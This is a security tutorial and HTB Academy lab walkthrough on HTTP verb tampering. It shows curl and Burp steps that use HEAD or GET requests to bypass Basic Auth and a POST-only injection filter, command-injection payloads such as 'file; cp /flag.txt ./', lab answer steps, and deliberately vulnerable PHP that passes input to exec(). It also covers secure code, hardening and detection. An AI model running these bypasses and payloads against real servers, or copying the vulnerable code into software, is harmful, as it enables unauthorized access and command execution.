# HTTP Verb Tampering

> **⚔️ Web Server Exploitation:** Exploiting HTTP methods to bypass authentication and security controls

## Overview

HTTP Verb Tampering attacks exploit web servers that accept many HTTP verbs and methods. These attacks can bypass web application authorization mechanisms or security controls by sending malicious requests using unexpected HTTP methods.

**Attack Types:**
- **Insecure Web Server Configurations** - Bypass HTTP Basic Authentication
- **Insecure Application Coding** - Bypass security filters and access controls

---

## 1. Bypassing Basic Authentication

### Attack Scenario

**Target:** Web applications with HTTP Basic Authentication protecting admin functionality

**Common Vulnerable Setup:**
```
/admin/          ← Protected directory (401 Unauthorized)
/admin/reset.php ← Reset functionality behind auth
```

### Identification Phase

**Step 1: Discover Protected Resources**
```bash
# Check if directory requires authentication
curl -i http://target.com/admin/

# Response: 401 Unauthorized + WWW-Authenticate header
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="Restricted Area"
```

**Step 2: Identify Supported HTTP Methods**
```bash
# Enumerate supported methods
curl -i -X OPTIONS http://target.com/admin/reset.php

# Common response
HTTP/1.1 200 OK
Allow: POST,OPTIONS,HEAD,GET
```

### Exploitation Techniques

#### Method 1: HEAD Request Bypass

**Theory:** HEAD requests often bypass authentication while still executing server-side code

```bash
# Original GET request (blocked)
curl -i http://target.com/admin/reset.php
# Response: 401 Unauthorized

# HEAD request bypass
curl -i -X HEAD http://target.com/admin/reset.php
# Response: 200 OK (empty body, but function executed)
```

#### Method 2: Alternative HTTP Methods

**Testing different verbs:**
```bash
# Test PUT method
curl -i -X PUT http://target.com/admin/reset.php

# Test DELETE method  
curl -i -X DELETE http://target.com/admin/reset.php

# Test PATCH method
curl -i -X PATCH http://target.com/admin/reset.php

# Test OPTIONS method
curl -i -X OPTIONS http://target.com/admin/reset.php
```

### Burp Suite Methodology

**Step 1: Intercept Original Request**
```http
GET /admin/reset.php HTTP/1.1
Host: target.com
User-Agent: Mozilla/5.0...
```

**Step 2: Change Request Method**
- Right-click intercepted request → "Change Request Method"
- Manually edit: `GET` → `HEAD` or other method

**Step 3: Forward and Observe**
- Monitor response codes
- Check if functionality executed (empty response = success for HEAD)

---

## 2. Bypassing Security Filters

### Attack Scenario

**Target:** Web applications with security filters that only check specific HTTP methods

**Common Vulnerable Setup:**
```
POST parameters → Security filter active (blocks injections)
GET parameters  → Security filter bypassed (injections allowed)
```

### Vulnerability Background

**Insecure Coding Patterns:**
- Security filters only check `$_POST` parameters
- Injection detection limited to specific HTTP methods
- Inconsistent input validation across methods
- Missing cross-method security controls

### Identification Phase

**Step 1: Trigger Security Filter**
```bash
# Try command injection with POST (should be blocked)
curl -X POST http://target.com/ -d "filename=test;id"

# Expected response: "Malicious Request Denied!"
```

**Step 2: Test Different HTTP Methods**
```bash
# Test same payload with GET method
curl http://target.com/?filename=test;id

# May bypass filter if only POST is filtered
```

### Exploitation Techniques

#### Method 1: POST to GET Conversion

**Scenario:** File upload form with injection protection

**Original Request (Blocked):**
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

filename=test;
```

**Response:** `Malicious Request Denied!`

**Bypass Request (Successful):**
```http
GET /?filename=test; HTTP/1.1
Host: target.com
```

**Response:** File created with special characters

#### Method 2: Command Injection Exploitation

**Test Payload:** Create two files to confirm injection
```bash
# Payload: file1; touch file2;
# URL encoded: file1%3B%20touch%20file2%3B

# POST request (blocked by filter)
curl -X POST http://target.com/ -d "filename=file1%3B%20touch%20file2%3B"

# GET request (bypasses filter)
curl "http://target.com/?filename=file1%3B%20touch%20file2%3B"
```

**Verification:** Check if both `file1` and `file2` were created

### Burp Suite Exploitation

**Step 1: Capture Original POST Request**
```http
POST / HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

filename=test;
```

**Step 2: Convert POST to GET**
- Right-click → "Change Request Method"
- Parameters automatically move to URL query string
- Forward modified request

**Step 3: Escalate to Command Injection**
```http
GET /?filename=file1%3B%20touch%20file2%3B HTTP/1.1
Host: target.com
```

---

## HTB Academy Lab Solutions

### Lab: File Manager Authentication Bypass

**Target:** `http://94.237.50.221:38391`

**Objective:** Access `/admin/reset.php` without credentials to delete all files

**Step-by-Step Solution:**

**1. Initial Reconnaissance**
```bash
# Check the application
curl -i http://94.237.50.221:38391/

# Try accessing admin area (should prompt for auth)
curl -i http://94.237.50.221:38391/admin/reset.php
# Response: 401 Unauthorized
```

**2. Enumerate HTTP Methods**
```bash
# Check supported methods
curl -i -X OPTIONS http://94.237.50.221:38391/admin/reset.php

# Expected response:
# Allow: POST,OPTIONS,HEAD,GET
```

**3. Bypass with HEAD Request**
```bash
# Execute reset function with HEAD method
curl -i -X HEAD http://94.237.50.221:38391/admin/reset.php

# Response: 200 OK (empty body)
# Files should be deleted successfully
```

**4. Verification**
```bash
# Verify files are deleted
curl -i http://94.237.50.221:38391/
# Should show empty file manager
```

**🎯 Flag:** `HTB{...}`

### Lab 2: Command Injection Filter Bypass

**Target:** `http://94.237.57.115:43846`

**Objective:** Bypass security filter and execute command: `file; cp /flag.txt ./`

**Step-by-Step Solution:**

**1. Test Security Filter**
```bash
# Try malicious filename with POST (should be blocked)
curl -X POST http://94.237.57.115:43846/ -d "filename=test;"

# Expected: "Malicious Request Denied!"
```

**2. Bypass Filter with GET Method**
```bash
# Convert POST to GET to bypass filter
curl "http://94.237.57.115:43846/?filename=test;"

# Should create file with special characters (no error)
```

**3. Execute Command Injection**
```bash
# Use payload to copy flag file
curl "http://94.237.57.115:43846/?filename=file;%20cp%20/flag.txt%20./"

# URL decoded payload: file; cp /flag.txt ./
```

**4. Verification**
```bash
# Check if flag.txt was copied to web directory
curl http://94.237.57.115:43846/flag.txt

# Should display the flag content
```

**Alternative Burp Method:**
1. Intercept POST request with payload: `filename=file; cp /flag.txt ./`
2. Right-click → "Change Request Method" → Convert to GET
3. Forward request
4. Access `http://94.237.57.115:43846/flag.txt` to retrieve flag

---

## Common HTTP Methods for Testing

### Standard Methods
```bash
GET     # Default - usually protected
POST    # Form submissions - usually protected  
HEAD    # Like GET but no body - often bypasses auth
PUT     # Upload/update - may bypass filters
DELETE  # Remove resources - may bypass restrictions
PATCH   # Partial updates - often overlooked
OPTIONS # Method enumeration - usually allowed
```

### Extended Methods
```bash
TRACE   # Debugging method - may reveal headers
CONNECT # Proxy method - rarely filtered
TRACK   # Microsoft extension - may bypass
COPY    # WebDAV method - may access resources
MOVE    # WebDAV method - may modify resources
LOCK    # WebDAV method - may control resources
```

---

## Automated Testing

### Custom Script for Method Testing
```bash
#!/bin/bash
# http-verb-test.sh

URL="$1"
METHODS=("GET" "POST" "HEAD" "PUT" "DELETE" "PATCH" "OPTIONS" "TRACE")

echo "Testing HTTP methods on: $URL"
echo "================================"

for method in "${METHODS[@]}"; do
    echo -n "Testing $method: "
    response=$(curl -s -o /dev/null -w "%{http_code}" -X "$method" "$URL")
    echo "HTTP $response"
done
```

**Usage:**
```bash
chmod +x http-verb-test.sh
./http-verb-test.sh http://target.com/admin/reset.php
```

### Burp Suite Intruder
**Setup:**
1. Send request to Intruder
2. Set position on HTTP method
3. Payload list: GET, POST, HEAD, PUT, DELETE, PATCH, OPTIONS
4. Start attack and analyze response codes

---

## Vulnerable Code Examples

### PHP - Insecure Authentication Handling
```php
<?php
// Vulnerable: Only checks authentication for GET
if ($_SERVER['REQUEST_METHOD'] == 'GET') {
    // Check authentication
    if (!isset($_SERVER['PHP_AUTH_USER'])) {
        header('WWW-Authenticate: Basic realm="Admin"');
        header('HTTP/1.0 401 Unauthorized');
        exit;
    }
}

// Dangerous: Function executes regardless of method
if (isset($_GET['action']) && $_GET['action'] == 'reset') {
    unlink_all_files(); // Executes for HEAD, POST, etc.
}
?>
```

### PHP - Insecure Security Filter
```php
<?php
// Vulnerable: Security filter only checks POST parameters
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $filename = $_POST['filename'];
    
    // Security filter for POST only
    if (preg_match('/[;|&`$]/', $filename)) {
        die("Malicious Request Denied!");
    }
}

// Dangerous: GET parameters bypass security filter
if (isset($_GET['filename'])) {
    $filename = $_GET['filename']; // No filtering!
    
    // Command injection vulnerability
    exec("touch uploads/" . $filename);
}

// Processing without method validation
if (isset($_POST['filename']) || isset($_GET['filename'])) {
    $file = $_POST['filename'] ?? $_GET['filename'];
    exec("touch uploads/" . $file); // Vulnerable to injection
}
?>
```

### Secure Implementation
```php
<?php
// Secure: Check authentication for all methods
function require_auth() {
    if (!isset($_SERVER['PHP_AUTH_USER'])) {
        header('WWW-Authenticate: Basic realm="Admin"');
        header('HTTP/1.0 401 Unauthorized');
        exit;
    }
}

// Secure: Consistent input validation across all methods
function validate_filename($filename) {
    // Block dangerous characters regardless of method
    if (preg_match('/[;|&`$<>]/', $filename)) {
        die("Invalid filename!");
    }
    
    // Whitelist approach
    if (!preg_match('/^[a-zA-Z0-9._-]+$/', $filename)) {
        die("Filename contains invalid characters!");
    }
    
    return true;
}

// Check auth before any processing
require_auth();

// Secure: Get input from any method with validation
$filename = '';
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['filename'])) {
    $filename = $_POST['filename'];
} elseif ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['filename'])) {
    $filename = $_GET['filename'];
}

// Apply security filter regardless of HTTP method
if (!empty($filename)) {
    validate_filename($filename);
    
    // Safe file creation with sanitization
    $safe_filename = basename($filename);
    touch("uploads/" . $safe_filename);
}
?>
```

---

## Prevention & Hardening

### Web Server Configuration

**Apache (.htaccess)**
```apache
# Restrict HTTP methods globally
<Limit GET POST>
    Require valid-user
</Limit>

# Block specific methods
<LimitExcept GET POST>
    Require all denied
</LimitExcept>
```

**Nginx**
```nginx
# Limit allowed methods
if ($request_method !~ ^(GET|POST)$ ) {
    return 405;
}

# Apply auth to all methods
location /admin/ {
    auth_basic "Restricted Area";
    auth_basic_user_file /etc/nginx/.htpasswd;
    
    # Ensure auth applies to all methods
    limit_except GET POST {
        deny all;
    }
}
```

### Application-Level Controls

**Comprehensive Method Checking:**
```php
<?php
// Define allowed methods for each endpoint
$allowed_methods = ['GET', 'POST'];
$current_method = $_SERVER['REQUEST_METHOD'];

if (!in_array($current_method, $allowed_methods)) {
    header('HTTP/1.1 405 Method Not Allowed');
    header('Allow: ' . implode(', ', $allowed_methods));
    exit;
}

// Apply authentication to all allowed methods
require_authentication();
?>
```

---

## Detection & Monitoring

### Log Analysis
```bash
# Monitor for unusual HTTP methods
grep -E "(HEAD|PUT|DELETE|PATCH|TRACE|OPTIONS)" /var/log/apache2/access.log

# Look for 200 responses to HEAD requests on admin paths
grep "HEAD.*admin.*200" /var/log/apache2/access.log
```

### Security Headers
```http
# Server response should include
Allow: GET, POST
Content-Security-Policy: default-src 'self'
X-Frame-Options: DENY
```

---

*HTTP Verb Tampering attacks highlight the importance of comprehensive method validation and consistent security controls across all HTTP verbs.* 